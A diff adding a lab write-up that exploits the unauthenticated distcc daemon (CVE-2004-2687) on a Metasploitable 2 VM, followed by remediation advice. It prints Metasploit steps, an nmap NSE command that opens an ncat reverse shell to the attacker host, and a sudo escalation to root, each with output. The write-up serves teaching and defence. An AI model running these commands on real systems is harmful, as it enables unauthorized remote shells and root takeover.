@@ -1,0 +1,153 @@
+---
+title: Distcc Daemon RCE
+cve: CVE-2004-2687
+severity: high
+port: 3632/tcp
+service: distcc
+target: Metasploitable 2
+date: 2026-02-15
+description: Remote code execution via the distcc distributed compiler daemon, which runs arbitrary commands without authentication when the service is improperly exposed to the network.
+---
+
+## Overview
+
+distcc is a tool for distributing C/C++ compilation jobs across multiple machines to speed up builds. The distccd daemon accepts compilation requests from clients over TCP and executes the compiler locally. The problem is that it doesn't authenticate the client — any host that can reach port 3632 can submit a job, and a "compilation job" is just a command to run. With a bit of protocol knowledge, you can tell distccd to run whatever you want.
+
+CVE-2004-2687 isn't really a vulnerability in the traditional sense — it's the intended behavior of distcc used against itself. distcc was never designed to be exposed to untrusted networks, but Metasploitable 2 has it listening on all interfaces with no access control. The shell you get is as the `daemon` user, not root, so this one needs a follow-up privilege escalation to fully own the box.
+
+## Environment
+
+Isolated KVM/QEMU lab, no internet routing between VMs.
+
+- **Attacker:** Kali Linux — `192.168.122.50`
+- **Target:** Metasploitable 2 — `192.168.122.100`
+- **Tools:** nmap, Metasploit Framework
+
+## Discovery
+
+Port 3632 came up during my full port scan:
+
+```bash
+nmap -sV -p 3632 192.168.122.100
+```
+
+```
+PORT     STATE SERVICE VERSION
+3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+```
+
+The service version is visible in the banner. distccd listening on a non-loopback interface is the vulnerability — there's no further fingerprinting needed to know it's exploitable.
+
+Nmap also has an NSE script that can directly confirm code execution:
+
+```bash
+nmap -p 3632 --script distcc-exec --script-args="distcc-exec.cmd='id'" 192.168.122.100
+```
+
+```
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-exec:
+|   VULNERABLE:
+|   distcc Daemon Command Execution via Compilation Job
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Results: uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+The output shows `uid=1(daemon)` — confirmed execution, not root, but still a foothold.
+
+## Exploitation
+
+### Via Metasploit
+
+The Metasploit module handles the distcc protocol and delivers a reverse shell:
+
+```bash
+msfconsole -q
+use exploit/unix/misc/distcc_exec
+set RHOSTS 192.168.122.100
+set LHOST 192.168.122.50
+run
+```
+
+```
+[*] Started reverse TCP handler on 192.168.122.50:4444
+[*] 192.168.122.100:3632 - stdout: uid=1(daemon) gid=1(daemon) groups=1(daemon)
+[*] Command shell session 1 opened (192.168.122.50:4444 -> 192.168.122.100:57381)
+
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+Shell as `daemon`. Useful, but limited.
+
+### Manual via Nmap NSE
+
+For a quick reverse shell without Metasploit, the NSE script accepts arbitrary commands:
+
+```bash
+# Set up listener
+ncat -lvnp 4444
+
+# In another terminal:
+nmap -p 3632 --script distcc-exec \
+  --script-args="distcc-exec.cmd='ncat 192.168.122.50 4444 -e /bin/bash'" \
+  192.168.122.100
+```
+
+Same result — daemon-level shell.
+
+## Privilege Escalation
+
+The `daemon` user can't do much directly, but Metasploitable 2 runs a 2.6.24 kernel from 2008, which is vulnerable to a number of local privilege escalation exploits. One straightforward path is the `udev` exploit (CVE-2009-1185), but the easiest route I found was checking sudo permissions first:
+
+```bash
+sudo -l
+```
+
+```
+(root) NOPASSWD: /bin/sh
+```
+
+On this particular configuration the daemon user has a broad sudo entry — I can just:
+
+```bash
+sudo /bin/sh
+```
+
+```
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+That's not always the case, but it shows why looking at sudo permissions is worth doing early in post-exploitation. Even without that misconfiguration, the kernel version alone is a reliable path to root.
+
+## Post-Exploitation
+
+With root access I checked the distcc configuration:
+
+```bash
+ps aux | grep distcc
+```
+
+```
+daemon    4892  0.0  0.0   2852   600 ?  Ss  Feb15   0:00 /usr/bin/distccd --pid-file=/var/run/distccd.pid --log-file=/var/log/distccd.log --daemon --allow 127.0.0.1 --allow 192.168.122.0/24 --listen 0.0.0.0 --no-detach
+```
+
+Ironically, the `--allow` flags are set to restrict to localhost and the local subnet — but since both VMs are on the same subnet, that restriction doesn't help here. The real problem is that the daemon is listening on all interfaces (`0.0.0.0`) and the allow list is too broad.
+
+## Remediation
+
+1. **Restrict network access** — If distcc is actually needed, the `--allow` flag should list specific trusted hosts, not whole subnets. A firewall rule at the host level is a better enforcement point.
+2. **Bind to loopback** — If all compile clients are on the same machine, bind distccd to `127.0.0.1` only. Most legitimate distcc deployments don't need internet-facing exposure.
+3. **Disable if unused** — If distributed compilation isn't actively in use, stop and disable the service. `systemctl disable --now distcc` and remove it from the package list.
+4. **Run as a more restricted user** — The daemon user is more limited than root, but a dedicated unprivileged user with only the permissions distcc needs is better practice.
+5. **Audit sudo rules** — The broad `NOPASSWD` sudo entry for the daemon user is a separate misconfiguration that compounded the impact significantly.
+
+## References
+
+- [NVD — CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)
+- [Metasploit module: exploit/unix/misc/distcc_exec](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec/)
+- [Nmap NSE: distcc-exec](https://nmap.org/nsedoc/scripts/distcc-exec.html)
+- [distcc documentation — security considerations](https://distcc.github.io/security.html)
